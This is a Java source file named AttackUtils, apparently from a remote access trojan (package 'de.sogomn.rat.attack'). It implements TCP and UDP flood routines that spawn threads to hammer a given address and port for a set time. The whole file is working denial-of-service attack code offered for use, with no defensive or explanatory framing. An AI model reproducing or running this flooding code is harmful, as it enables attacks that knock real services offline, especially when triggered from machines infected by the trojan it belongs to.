/*
 * Copyright 2016 Johannes Boczek
 */

package de.sogomn.rat.attack;

import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.Socket;

public final class AttackUtils {
	
	private static final int TCP_INTERVAL = 1;
	private static final int WAVE_INTERVAL = 500;
	
	private AttackUtils() {
		//...
	}
	
	public static void launchTcpWave(final String address, final int port) {
		final Runnable runnable = () -> {
			try {
				final Socket socket = new Socket(address, port);
				final OutputStream out = socket.getOutputStream();
				
				while (socket.isConnected() && !socket.isClosed()) {
					final byte[] data = new byte[1];
					
					out.write(data);
					out.flush();
					
					Thread.sleep(TCP_INTERVAL);
				}
				
				out.close();
				socket.close();
			} catch (final Exception ex) {
				System.err.println(ex);
			}
		};
		final Thread thread = new Thread(runnable);
		
		thread.start();
	}
	
	public static void launchUdpWave(final String address) {
		final Runnable runnable = () -> {
			/*65535 = Max port*/
			final int port = (int)(Math.random() * 65534) + 1;
			final InetSocketAddress socketAddress = new InetSocketAddress(address, port);
			final byte randomData = (byte)(Math.random() * Byte.MAX_VALUE);
			
			try {
				final DatagramSocket socket = new DatagramSocket();
				final byte[] data = {randomData};
				final DatagramPacket packet = new DatagramPacket(data, data.length, socketAddress);
				
				socket.send(packet);
				socket.close();
			} catch (final Exception ex) {
				System.err.println(ex);
			}
		};
		final Thread thread = new Thread(runnable);
		
		thread.start();
	}
	
	public static void launchTcpFlood(final String address, final int port, final long milliseconds) {
		final long time = System.currentTimeMillis();
		
		while (System.currentTimeMillis() - time <= milliseconds) {
			launchTcpWave(address, port);
			
			try {
				Thread.sleep(WAVE_INTERVAL);
			} catch (final InterruptedException ex) {
				ex.printStackTrace();
			}
		}
	}
	
	public static void launchUdpFlood(final String address, final long milliseconds) {
		final long time = System.currentTimeMillis();
		
		while (System.currentTimeMillis() - time < milliseconds) {
			launchUdpWave(address);
			
			try {
				Thread.sleep(WAVE_INTERVAL);
			} catch (final InterruptedException ex) {
				ex.printStackTrace();
			}
		}
	}
	
}
